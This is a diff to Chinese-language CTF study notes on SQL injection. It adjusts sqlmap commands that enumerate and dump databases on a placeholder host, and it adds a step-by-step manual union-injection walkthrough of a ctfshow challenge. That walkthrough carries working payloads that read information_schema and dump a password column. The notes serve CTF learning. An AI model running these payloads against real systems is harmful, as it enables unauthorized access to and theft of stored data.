@@ -353,13 +353,13 @@ if __name__ == '__main__':
 ```bash
 # 找到注入点，如 /?id=1
 # 查数据库
-python sqlmap.py --batch -u http://x.com/?id=1 --dbs
+python sqlmap.py -u http://x.com/?id=1 --dbs
 # 查 N 数据库的表名
-python sqlmap.py --batch -u http://x.com/?id=1 -D N --tables
+python sqlmap.py -u http://x.com/?id=1 -D N --tables
 # 查 N 数据库的A 表的列名
-python sqlmap.py --batch -u http://x.com/?id=1 -D N -T A --columns
+python sqlmap.py -u http://x.com/?id=1 -D N -T A --columns
 # 查 N 数据库的 A 表的 B 列数据
-python sqlmap.py --batch -u http://x.com/?id=1  -D N -T A -C B --dump
+python sqlmap.py -u http://x.com/?id=1  -D N -T A -C B --dump
 
 
 # 高级注入（只举例第一步，同样适用于 POST 请求）
@@ -418,6 +418,79 @@ select * from 'admin' where password=md5($pass,true)
 1;show tables#
 1;show columns from 'Flag'#
 ```
+
+#### 手工注入
+
+##### 联合查询 (union)
+
+例子：
+
+后端语句
+
+```sql
+$sql = "select username,password from user where username !='flag' and id = '".$_GET['id']."' limit 1;";
+```
+
+###### 确认当前表有几列
+
+先确认表中有几列（此处是 3 列。order by 语法是从 1 开始计算的，所以 3 是第三列）。`%23` 是 `#` 的 URL 编码，这里会注释后面的语句
+
+```sql
+1' order by 3%23
+```
+
+###### 确认前端会一一对应显示几列
+
+构造新的一行 (1, 2, 3) 并显示在前端
+
+```sql
+1' union select 1,2,3%23
+```
+
+###### 测试第三列能否显示 database()
+
+在第3列显示当前连接的数据库名（这一句只用来测试，下一句才正式开始查询）
+
+```sql
+1' union select 1,2,database()%23
+```
+
+###### 在第二列显示数据库名
+
+同时在第二列显示所有数据库名
+
+- `GROUP_CONCAT` 是一个 SQL 函数，它主要在 MySQL 中使用，用于将多行数据连接成一个字符串。这个函数在处理由 GROUP BY 子句产生的分组结果时特别有用。
+- `information_schema.schemata` 表来获取数据库的信息
+
+```sql
+1' union select 1,(select group_concat(schema_name) from information_schema.schemata),database()%23
+```
+
+###### 继续显示表名
+
+上面语句显示的数据库名是 ctfshow_web，此处显示 ctfshow_web 数据库中的所有表名
+
+```sql
+1' union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='ctfshow_web'),database()%23
+```
+
+###### 继续显示属性名
+
+上面语句显示的表名是 ctfshow_user, ctfshow_user2，此处显示 ctfshow_user2 的属性名
+
+```sql
+1' union select 1,(select group_concat(column_name) from information_schema.columns where table_schema='ctfshow_web' and table_name='ctfshow_user2'),database()%23
+```
+
+###### 查询表中属性对应的值
+
+上面语句显示的属性名是 id,username,password，此处显示 password 属性的所有数据
+
+```sql
+1' union select 1,(select group_concat(password) from ctfshow_web.ctfshow_user2),database()%23
+```
+
+在 ctfshow_web.ctfshow_user2 的 password 属性值中，我们发现了 flag
 
 #### SQL 盲注
 
